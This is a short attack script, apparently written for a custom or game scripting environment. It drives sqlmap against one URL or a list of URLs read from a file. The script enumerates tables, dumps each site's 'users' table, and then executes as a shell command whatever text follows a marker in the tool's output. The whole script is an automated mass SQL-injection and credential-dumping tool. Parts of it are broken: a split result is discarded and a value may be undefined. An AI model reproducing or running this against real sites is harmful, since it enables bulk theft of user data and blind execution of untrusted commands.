let target :string = `null`
const args = Shell.GetArgs()
if (args.length==1){
    const website = args[0]
    let output = await Shell.Process.exec(`sqlmap -u `+website+' -tables')
    println(output.split(`[ERROR]`))
    if ((output.indexOf(`[ERROR] `))!=-1){
        Debug.Error(`URL:`+website+" Errored")
        Shell.quit("SQL Errored")
    }
    else{
        let output = await Shell.Process.exec(`sqlmap -u `+website+` -dump -table users`)
        let temp = output.split(`Crack them into the VPN cert: `)[1]
        temp.split(`
 
 `)
        Shell.Process.exec((temp))
    }
}
else{
    let content = await FileSystem.ReadFile(`/data/t2.txt`)
    let targets = []
    const websites = `${content}`
        .split(`\n`)
        .map(line=>line.trim())
        .filter(line=>line.length>0)
    for (const website of websites){
        let output = await Shell.Process.exec(`sqlmap -u `+website+' -tables',{silent:true})
        if ((output.indexOf(`[ERROR] `))!=-1){
        Debug.Error(`URL:`+website+" Errored")
        continue
    }
    else{
        let output = await Shell.Process.exec(`sqlmap -u `+website+` -dump -table users`)
        let temp = output.split(`Crack them into the VPN cert: `)[1]
        temp.split(`
 
 `)
        Shell.Process.exec((temp))
    }
    }
}